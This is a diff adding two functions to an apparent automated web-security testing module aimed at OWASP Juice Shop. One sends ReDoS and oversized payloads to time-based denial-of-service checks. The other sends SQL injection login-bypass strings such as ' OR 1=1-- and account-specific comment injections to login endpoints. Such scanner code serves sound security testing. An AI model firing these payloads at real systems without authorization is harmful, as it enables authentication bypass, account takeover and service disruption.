@@ -3856,7 +3856,336 @@ async def test_nosql_injection(
 
 
 # ============================================================================
-# MODULE COMPLETE: 23 comprehensive input validation tools implemented
-# Coverage: WSTG 4.7.1 - 4.7.19 (All major tests covered) + HTTP Verb Tampering + HTTP Incoming Requests + NoSQL Injection
+# WSTG-INPV-13: Test for ReDoS and Algorithmic Complexity Attacks
+# ============================================================================
+
+async def test_redos(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """Test for Regular Expression Denial of Service (ReDoS) on input fields (WSTG-INPV-13)."""
+    try:
+        import time
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+        if auth_session:
+            if auth_session.get("token"):
+                headers["Authorization"] = f"Bearer {auth_session['token']}"
+            if auth_session.get("cookies"):
+                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_session["cookies"].items())
+
+        findings = []
+
+        # ReDoS payloads designed to trigger exponential backtracking
+        redos_payloads = [
+            ("a" * 50 + "!", "exponential_backtracking_a"),
+            ("0" * 50 + "!", "numeric_backtracking"),
+            ("<" + "=" * 50 + "!", "html_tag_backtracking"),
+            ("a]" * 25 + "!", "bracket_backtracking"),
+            ("{" + "," * 50 + "!", "json_backtracking"),
+        ]
+
+        # Long string payload for algorithmic complexity
+        long_payloads = [
+            ("A" * 100000, "long_string_100k"),
+            ("A" * 10000 + "<script>", "long_string_with_tag"),
+            ("{" * 10000, "deeply_nested_json"),
+        ]
+
+        # Endpoints to test
+        test_endpoints = [
+            ("GET", "/rest/products/search", "q"),
+            ("POST", "/api/Users", None),
+            ("POST", "/api/Feedbacks", None),
+            ("POST", "/rest/user/login", None),
+        ]
+
+        async with httpx.AsyncClient(timeout=30.0, verify=False, follow_redirects=True, headers=headers) as client:
+            for method, path, param_name in test_endpoints:
+                # Test ReDoS payloads
+                for payload, payload_type in redos_payloads:
+                    try:
+                        start = time.monotonic()
+                        if method == "GET" and param_name:
+                            resp = await client.get(f"{base_url}{path}", params={param_name: payload})
+                        elif method == "POST":
+                            if "login" in path:
+                                resp = await client.post(f"{base_url}{path}", json={"email": payload, "password": "x"})
+                            elif "Users" in path:
+                                resp = await client.post(f"{base_url}{path}", json={"email": payload, "password": "x"})
+                            elif "Feedbacks" in path:
+                                resp = await client.post(f"{base_url}{path}", json={"comment": payload, "rating": 1})
+                            else:
+                                continue
+                        elapsed = time.monotonic() - start
+
+                        # If response takes >5s, likely ReDoS
+                        if elapsed > 5.0:
+                            findings.append({
+                                "type": f"ReDoS: {payload_type}",
+                                "endpoint": path,
+                                "severity": "high",
+                                "description": f"Response took {elapsed:.1f}s with ReDoS payload ({payload_type})",
+                                "evidence": f"Endpoint: {path}, Time: {elapsed:.1f}s, Status: {resp.status_code}"
+                            })
+                    except httpx.ReadTimeout:
+                        findings.append({
+                            "type": f"ReDoS timeout: {payload_type}",
+                            "endpoint": path,
+                            "severity": "high",
+                            "description": f"Request timed out with ReDoS payload ({payload_type})",
+                            "evidence": f"Endpoint: {path}, Payload type: {payload_type}"
+                        })
+                    except Exception:
+                        continue
+
+                # Test algorithmic complexity (long strings)
+                for payload, payload_type in long_payloads:
+                    try:
+                        start = time.monotonic()
+                        if method == "GET" and param_name:
+                            resp = await client.get(f"{base_url}{path}", params={param_name: payload})
+                        elif method == "POST":
+                            if "login" in path:
+                                resp = await client.post(f"{base_url}{path}", json={"email": payload, "password": "x"})
+                            elif "Feedbacks" in path:
+                                resp = await client.post(f"{base_url}{path}", json={"comment": payload, "rating": 1})
+                            else:
+                                continue
+                        elapsed = time.monotonic() - start
+
+                        if elapsed > 5.0:
+                            findings.append({
+                                "type": f"Algorithmic complexity: {payload_type}",
+                                "endpoint": path,
+                                "severity": "medium",
+                                "description": f"Long input caused {elapsed:.1f}s response ({payload_type})",
+                                "evidence": f"Endpoint: {path}, Time: {elapsed:.1f}s, Payload size: {len(payload)}"
+                            })
+                        # Also check if server accepted huge input without validation
+                        elif resp.status_code == 200 and len(payload) > 50000:
+                            findings.append({
+                                "type": f"Missing input length validation: {payload_type}",
+                                "endpoint": path,
+                                "severity": "low",
+                                "description": f"Server accepted {len(payload)}-char input without rejection",
+                                "evidence": f"Endpoint: {path}, Status: {resp.status_code}, Input size: {len(payload)}"
+                            })
+                    except httpx.ReadTimeout:
+                        findings.append({
+                            "type": f"DoS via {payload_type}",
+                            "endpoint": path,
+                            "severity": "high",
+                            "description": f"Request timed out with large payload ({payload_type})",
+                            "evidence": f"Endpoint: {path}, Payload size: {len(payload)}"
+                        })
+                    except Exception:
+                        continue
+
+        return {"status": "success", "data": {
+            "vulnerable": any(f.get("severity") in ("high", "critical") for f in findings),
+            "findings": findings,
+            "vulnerabilities_found": len(findings)
+        }}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+
+# ============================================================================
+# WSTG-ATHN-03: Test SQL Injection on Login Endpoints
+# ============================================================================
+
+async def test_sqli_login(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """
+    WSTG-ATHN-03: Test login endpoints for SQL Injection authentication bypass.
+
+    Sends targeted SQLi payloads to common login endpoints (email/username field)
+    to detect authentication bypass, error-based information disclosure, and
+    specific user account takeover via SQL injection.
+
+    Targets Juice Shop login_bypass challenges:
+    - Login Admin (' OR 1=1--)
+    - Login Bender (bender@juice-sh.op'--)
+    - Login Jim (jim@juice-sh.op'--)
+    - Login Chris / deleted user access (' OR deletedAt IS NOT NULL--)
+
+    Args:
+        url: Base URL of the target application (e.g., http://juice-shop:3000)
+        auth_session: Optional authentication session dict with token/cookies
+
+    Returns:
+        Dict with status, vulnerable flag, and list of findings
+    """
+    try:
+        import httpx
+        from urllib.parse import urlparse, urljoin
+
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        login_endpoints = [
+            "/rest/user/login",
+            "/api/login",
+            "/login",
+            "/api/auth/login",
+        ]
+
+        sqli_payloads = [
+            ("' OR 1=1--", "generic_admin_bypass", "Generic admin bypass via boolean tautology"),
+            ("' OR 1=1;--", "generic_admin_bypass_variant", "Boolean tautology variant with semicolon"),
+            ("admin@juice-sh.op'--", "specific_user_bypass_admin", "Specific user bypass targeting admin account"),
+            ("bender@juice-sh.op'--", "specific_user_bypass_bender", "Specific user bypass targeting Bender account"),
+            ("jim@juice-sh.op'--", "specific_user_bypass_jim", "Specific user bypass targeting Jim account"),
+            ("' OR deletedAt IS NOT NULL--", "deleted_user_access", "Access soft-deleted user accounts via column reference"),
+            ("chris.pike@juice-sh.op'--", "deleted_user_bypass_chris", "Specific deleted user bypass targeting Chris Pike"),
+        ]
+
+        sql_error_patterns = [
+            r"SQLITE_ERROR",
+            r"sql syntax",
+            r"sqlite3\.OperationalError",
+            r"mysql_fetch",
+            r"pg_query",
+            r"ORA-\d+",
+            r"Microsoft SQL Server",
+            r"Unclosed quotation",
+            r"unrecognized token",
+            r"near \".*?\": syntax error",
+        ]
+
+        findings = []
+
+        req_kwargs = {"timeout": 20, "verify": False, "follow_redirects": True}
+        if auth_session:
+            if 'cookies' in auth_session:
+                req_kwargs['cookies'] = auth_session['cookies']
+            if 'headers' in auth_session:
+                req_kwargs['headers'] = auth_session.get('headers', {})
+            elif 'token' in auth_session:
+                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
+
+        async with httpx.AsyncClient(**req_kwargs) as client:
+            for endpoint in login_endpoints:
+                login_url = urljoin(base_url, endpoint)
+
+                for payload, attack_type, description in sqli_payloads:
+                    # === Test 1: JSON body (application/json) ===
+                    try:
+                        json_body = {"email": payload, "password": "x"}
+                        resp = await client.post(
+                            login_url,
+                            json=json_body,
+                            headers={"Content-Type": "application/json"}
+                        )
+
+                        resp_text = resp.text.lower()
+
+                        # Success detection: status 200 + authentication/token in response
+                        if resp.status_code == 200 and ("authentication" in resp_text or "token" in resp_text):
+                            findings.append({
+                                "endpoint": endpoint,
+                                "payload": payload,
+                                "type": f"sqli_login_bypass_{attack_type}",
+                                "method": "POST (JSON)",
+                                "description": description,
+                                "evidence": f"HTTP 200 with auth token returned. Response preview: {resp.text[:300]}",
+                                "severity": "critical"
+                            })
+
+                        # Error-based SQLi detection
+                        for pattern in sql_error_patterns:
+                            if re.search(pattern, resp.text, re.IGNORECASE):
+                                findings.append({
+                                    "endpoint": endpoint,
+                                    "payload": payload,
+                                    "type": f"sqli_error_disclosure_{attack_type}",
+                                    "method": "POST (JSON)",
+                                    "description": f"SQL error disclosed: {description}",
+                                    "evidence": f"Pattern '{pattern}' matched. Response preview: {resp.text[:300]}",
+                                    "severity": "high"
+                                })
+                                break
+
+                    except Exception:
+                        pass
+
+                    # === Test 2: Form-encoded body ===
+                    try:
+                        form_data = f"email={quote(payload)}&password=x"
+                        resp = await client.post(
+                            login_url,
+                            content=form_data,
+                            headers={"Content-Type": "application/x-www-form-urlencoded"}
+                        )
+
+                        resp_text = resp.text.lower()
+
+                        # Success detection
+                        if resp.status_code == 200 and ("authentication" in resp_text or "token" in resp_text):
+                            findings.append({
+                                "endpoint": endpoint,
+                                "payload": payload,
+                                "type": f"sqli_login_bypass_{attack_type}",
+                                "method": "POST (form-encoded)",
+                                "description": description,
+                                "evidence": f"HTTP 200 with auth token returned. Response preview: {resp.text[:300]}",
+                                "severity": "critical"
+                            })
+
+                        # Error-based SQLi detection
+                        for pattern in sql_error_patterns:
+                            if re.search(pattern, resp.text, re.IGNORECASE):
+                                findings.append({
+                                    "endpoint": endpoint,
+                                    "payload": payload,
+                                    "type": f"sqli_error_disclosure_{attack_type}",
+                                    "method": "POST (form-encoded)",
+                                    "description": f"SQL error disclosed: {description}",
+                                    "evidence": f"Pattern '{pattern}' matched. Response preview: {resp.text[:300]}",
+                                    "severity": "high"
+                                })
+                                break
+
+                    except Exception:
+                        pass
+
+        # Deduplicate findings by (endpoint, payload, type, method)
+        seen = set()
+        unique_findings = []
+        for f in findings:
+            key = (f.get("endpoint"), f.get("payload"), f.get("type"), f.get("method"))
+            if key not in seen:
+                seen.add(key)
+                unique_findings.append(f)
+
+        if unique_findings:
+            return {
+                "status": "success",
+                "data": {
+                    "vulnerable": True,
+                    "findings": unique_findings,
+                    "endpoints_tested": len(login_endpoints),
+                    "payloads_tested": len(sqli_payloads),
+                    "message": f"Found {len(unique_findings)} SQL injection login bypass vulnerabilities"
+                }
+            }
+        else:
+            return {
+                "status": "success",
+                "data": {
+                    "vulnerable": False,
+                    "endpoints_tested": len(login_endpoints),
+                    "payloads_tested": len(sqli_payloads),
+                    "message": "No SQL injection login bypass vulnerabilities detected"
+                }
+            }
+
+    except Exception as e:
+        return {"status": "error", "message": f"SQL injection login test failed: {str(e)}"}
+
+
+# ============================================================================
+# MODULE COMPLETE: 24 comprehensive input validation tools implemented
+# Coverage: WSTG 4.7.1 - 4.7.19 (All major tests covered) + HTTP Verb Tampering + HTTP Incoming Requests + NoSQL Injection + SQLi Login Bypass
 # ============================================================================
 
